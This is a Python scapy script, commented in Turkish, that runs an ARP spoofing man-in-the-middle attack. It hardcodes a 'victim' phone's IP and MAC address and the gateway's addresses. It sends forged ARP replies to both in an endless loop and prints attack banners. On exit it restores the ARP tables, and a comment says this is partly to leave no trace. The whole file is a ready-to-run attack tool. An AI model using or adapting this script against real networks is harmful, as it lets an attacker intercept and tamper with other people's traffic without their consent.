import scapy.all as scapy
import time
import sys

# Kurban (Telefon) Bilgileri
target_ip = "10.86.167.159"
target_mac = "24:41:8C:3E:ED:83"

# Modem (Gateway) Bilgileri
gateway_ip = "10.86.167.112"
gateway_mac = "8a:49:42:06:ce:87"

# Kullanılan Arayüz
interface = "wlan0"
# -------------------------------------------------------------

def spoof(target_ip, target_mac, spoof_ip):
    """
    Hedefe sahte ARP cevabı gönderir.
    target_ip: Kime yalan söylüyoruz?
    target_mac: Onun fiziksel adresi ne?
    spoof_ip: Biz kimin taklidini yapıyoruz?
    """
    # op=2 -> ARP Reply (Cevap) paketi
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False, iface=interface)

def restore(dest_ip, dest_mac, source_ip, source_mac):
    """
    Program kapatıldığında ARP tablolarını düzeltir (İz bırakmamak ve ağı bozmamak için).
    """
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False, iface=interface)

# --- ANA PROGRAM ---
try:
    print("\n" + "="*50)
    print(f"[*] SALDIRI BAŞLATILIYOR: {interface} üzerinden")
    print(f"[*] Kurban: {target_ip} ({target_mac})")
    print(f"[*] Modem : {gateway_ip} ({gateway_mac})")
    print("="*50)
    print("[*] Çıkmak için CTRL+C tuşuna basabilirsin.\n")

    sent_packets_count = 0
    while True:
        # 1. Kurbana git: "Ben Modemim (192.168.1.1)" de
        spoof(target_ip, target_mac, gateway_ip)
        
        # 2. Modeme git: "Ben Kurbanım (192.168.1.100)" de
        spoof(gateway_ip, gateway_mac, target_ip)
        
        sent_packets_count += 2
        # Ekrana dinamik yazdırma
        print(f"\r[+] Gönderilen ARP Paketi Sayısı: {sent_packets_count}", end="")
        
        # Ağı kilitlememek için 2 saniye bekle
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[!] Saldırı durduruldu. (CTRL+C tespit edildi)")
    print("[*] ARP tabloları eski haline getiriliyor (Restore)...")
    restore(target_ip, target_mac, gateway_ip, gateway_mac)
    restore(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] İşlem tamam. Güle güle!")
